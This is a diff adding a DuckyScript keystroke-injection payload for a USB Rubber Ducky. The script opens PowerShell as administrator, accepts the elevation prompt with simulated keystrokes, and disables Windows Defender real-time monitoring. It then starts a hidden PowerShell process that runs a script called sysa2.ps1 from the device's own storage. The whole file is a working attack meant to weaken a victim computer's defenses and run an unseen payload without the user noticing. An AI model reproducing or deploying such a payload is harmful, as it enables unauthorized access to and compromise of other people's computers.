@@ -1,0 +1,23 @@
+DEFAULT_DELAY 350
+REM -----Delay of 1.5 seconds to let the "Keyboard" initialize
+DELAY 200
+ATTACKMODE HID STORAGE
+REM -----open Powershell as Admin
+GUI r
+DELAY 200
+STRING powershell 
+CTRL-SHIFT ENTER
+DELAY 400
+LEFT
+ENTER
+DELAY 500
+
+STRING $duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq 'DUCKY' }).DeviceID;cd $duckletter
+ENTER
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+
+STRINGLN Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -File sysa2.ps1"  -WindowStyle Hidden
+
+STRING exit
+ENTER
